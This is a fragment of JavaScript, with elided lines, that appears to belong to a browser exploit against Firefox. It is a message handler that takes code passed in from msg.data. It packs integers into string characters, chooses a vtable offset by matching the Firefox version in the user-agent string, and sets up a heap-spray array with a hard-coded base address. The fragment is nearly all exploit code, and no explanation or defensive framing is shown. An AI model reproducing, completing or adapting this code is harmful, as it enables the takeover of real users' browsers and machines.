...
function(msg) {
  ...
  thecode = msg.data;
  var pack = function (b) { var a = b >> 16; return String.fromCharCode(b & 65535) + String.fromCharCode(a) };
  ...
  var conv=new ArrayBuffer(8),
      ...
      /.*Firefox\/(41\.0(\.[1-2]|)|42\.0).*/.test(navigator.userAgent)? vtable_offset=304 : 
      /.*Firefox\/(4[3-9]|[5-9]\d+|[1-9]\d{2,})\..*/.test(navigator.userAgent) && (vtable_offset=308);
      var spr=Array(400),
      arrBase=805306416,
